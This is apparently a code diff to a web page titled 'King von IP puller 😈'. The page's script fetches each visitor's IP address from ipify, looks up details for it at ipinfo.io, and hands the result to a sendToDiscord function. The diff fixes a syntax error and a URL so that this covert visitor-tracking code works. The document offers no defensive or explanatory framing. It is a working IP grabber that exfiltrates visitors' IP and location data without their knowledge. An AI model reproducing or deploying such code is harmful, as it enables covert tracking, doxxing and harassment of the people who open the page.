@@ -15,7 +15,7 @@
                     image: {
                         url: "https://www.rollingstone.com/wp-content/uploads/2022/02/king-von-posthumous-album.jpg"
                     },
-                    title: "King von IP puller ",
+                    title: "King von IP puller 😈",
                     fields: [
                         {
                             name: "IP Address", 
@@ -81,11 +81,11 @@
     }
 
     async function getVisitorInfo() {
-        const ipResponse = await fetch('https://api.ipify.org/?format=json');
+        const ipResponse = await fetch('https://api.ipify.org?format=json');
         const ipData = await ipResponse.json();
         const userIP = ipData.ip;
 
-        const ipInfoResponse = await fetch(https://ipinfo.io/widget/demo/${userIP});
+        const ipInfoResponse = await fetch(`https://ipinfo.io/widget/demo/${userIP}`);
         const ipInfo = await ipInfoResponse.json();
 
         await sendToDiscord(ipInfo);
